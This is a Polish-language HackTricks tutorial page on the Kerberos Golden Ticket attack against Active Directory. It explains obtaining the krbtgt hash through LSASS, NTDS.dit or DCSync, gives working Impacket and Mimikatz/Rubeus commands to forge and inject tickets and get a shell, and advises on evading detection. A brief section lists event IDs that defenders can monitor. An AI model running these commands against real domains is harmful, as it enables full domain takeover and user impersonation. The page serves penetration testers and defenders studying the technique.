# Złoty bilet

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Złoty bilet

Atak **Złotego biletu** polega na **utworzeniu legalnego biletu upoważniającego do wydawania biletów (TGT) podając się za dowolnego użytkownika** poprzez użycie **skrótu NTLM konta krbtgt Active Directory (AD)**. Ta technika jest szczególnie korzystna, ponieważ umożliwia dostęp do dowolnej usługi lub maszyny w domenie jako podszywający się użytkownik. Ważne jest pamiętanie, że **poświadczenia konta krbtgt nie są automatycznie aktualizowane**.

Aby **uzyskać skrót NTLM** konta krbtgt, można zastosować różne metody. Może być on wyodrębniony z procesu **Local Security Authority Subsystem Service (LSASS)** lub pliku **NT Directory Services (NTDS.dit)** znajdującego się na dowolnym kontrolerze domeny (DC) w domenie. Ponadto, **wykonanie ataku DCsync** to kolejna strategia pozyskania tego skrótu NTLM, który można przeprowadzić za pomocą narzędzi takich jak moduł **lsadump::dcsync** w Mimikatz lub skrypt **secretsdump.py** w Impacket. Ważne jest podkreślenie, że do wykonania tych operacji zwykle wymagane są **uprawnienia administratora domeny lub podobny poziom dostępu**.

Chociaż skrót NTLM jest odpowiednią metodą w tym celu, **zdecydowanie zaleca się** tworzenie biletów za pomocą **zaawansowanego standardu szyfrowania Advanced Encryption Standard (AES) Kerberos (AES128 i AES256)** ze względów bezpieczeństwa operacyjnego.


{% code title="Z systemu Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Z systemu Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Po** wstrzyknięciu **złotego biletu**, można uzyskać dostęp do udostępnionych plików **(C$)** oraz wykonywać usługi i WMI, dzięki czemu można użyć **psexec** lub **wmiexec** do uzyskania powłoki (wygląda na to, że nie można uzyskać powłoki za pomocą winrm).

### Omijanie często występujących wykryć

Najczęstsze sposoby wykrywania złotego biletu polegają na **inspekcji ruchu Kerberos** w sieci. Domyślnie Mimikatz **podpisuje TGT na 10 lat**, co będzie się wyróżniać jako anomalne w kolejnych żądaniach TGS z nim związanych.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Użyj parametrów `/startoffset`, `/endin` i `/renewmax`, aby kontrolować przesunięcie początkowe, czas trwania i maksymalną liczbę odnowień (wszystko w minutach).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Niestety, czas życia TGT nie jest rejestrowany w 4769, więc nie znajdziesz tych informacji w dziennikach zdarzeń systemu Windows. Jednak to, co możesz skorelować, to **obecność 4769 bez wcześniejszego 4768**. **Nie jest możliwe żądanie TGS bez TGT**, a jeśli nie ma informacji o wydaniu TGT, możemy wnioskować, że został on sfałszowany offline.

Aby **obejść tę kontrolę wykrywania**, sprawdź bilety diamentowe:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Zapobieganie

* 4624: Logowanie konta
* 4672: Logowanie administratora
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Inne małe sztuczki, które mogą zastosować obrońcy, to **alarmowanie o 4769 dla użytkowników ochronnych**, takich jak domyślne konto administratora domeny.

## Odwołania
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
